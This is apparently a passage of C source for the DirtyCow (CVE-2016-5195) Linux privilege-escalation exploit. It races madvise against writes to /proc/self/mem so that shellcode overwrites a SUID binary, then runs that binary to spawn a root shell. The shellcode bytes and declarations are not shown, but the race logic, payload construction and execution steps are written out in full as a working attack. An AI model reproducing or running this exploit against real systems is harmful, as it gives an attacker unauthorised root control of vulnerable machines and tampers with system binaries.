void *madviseThread(void *arg)
{
    int i,c=0;
    for(i=0;i<1000000 && !stop;i++) {
        c+=madvise(map,100,MADV_DONTNEED);
    }
    printf("madvise thread stopped\n");
}

void *procselfmemThread(void *arg)
{
    char *str=(char*)arg;
    int f=open("/proc/self/mem",O_RDWR);
    int i,c=0;
    for(i=0; i<1000000 && !stop; i++) 
    {
        lseek(f,(off_t)map,SEEK_SET);
        c+=write(f, str, shellcode_len);
    }
    printf("procselfmem thread stopped\n");
}

void *waitForWrite(void *arg) {
    char buf[shellcode_len];

    while(1) 
	{
        FILE *fp = fopen(suid_binary, "rb");

        fread(buf, shellcode_len, 1, fp); // search for the shellcode injection in sudo_binary

        if(memcmp(buf, shellcode, shellcode_len) == 0) // if the shellcode is present in the binary then we succsessfuly overwritten it -> break and stop the threads.
		{
            printf("%s overwritten\n", suid_binary);
            break;
        }

        fclose(fp);
    }

    stop = 1;

    printf("\n[*] Popping root shell\n");

    system(suid_binary);
}

int main(int argc,char *argv[]) 
{
    printf("DirtyCow (CVE-2016-5195) root privilege escalation\n");
    /*
    * Steps:
    * 1. Get the size of the suid_binary and make a backup.
    * 2. Overwrite this binary with a shell (ELF file) plus padding (so itâ€™s the same size as the SUID binary).
    * 3. Execute the new shell.
    */

    size_t bakSize = strlen("cp  /tmp/suid_binary") + strlen(suid_binary) + 1;
    char *backup = (char*)malloc(bakSize);

    printf("Backing up %s to /tmp/suid_binary\n", suid_binary);

    snprintf(backup, bakSize, "cp %s /tmp/suid_binary", suid_binary);
    system(backup);

    free(backup);

    f = open(suid_binary,O_RDONLY);
    fstat(f,&st); // get the file's details

    printf("Size of binary: %ld\n", st.st_size);

    char payload[st.st_size];
    memset(payload, 0x90, st.st_size); // to overwrite the whole suid_binary with 0x90 (nopsled)
    memcpy(payload, shellcode, shellcode_len+1); // to overwrite suid_binary with the shellcode to later run

    map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0); // MAP_PRIVATE flag tells the kernel to use COW technique 

    printf("Racing...\n");

    // Creating the threads
    pthread_create(&pth1, NULL, &madviseThread, suid_binary);
    pthread_create(&pth2, NULL, &procselfmemThread, payload);
    pthread_create(&pth3, NULL, &waitForWrite, NULL);

    pthread_join(pth3, NULL); // tell main to wait until we finish writing (waitForWrite)

    return 0;
}
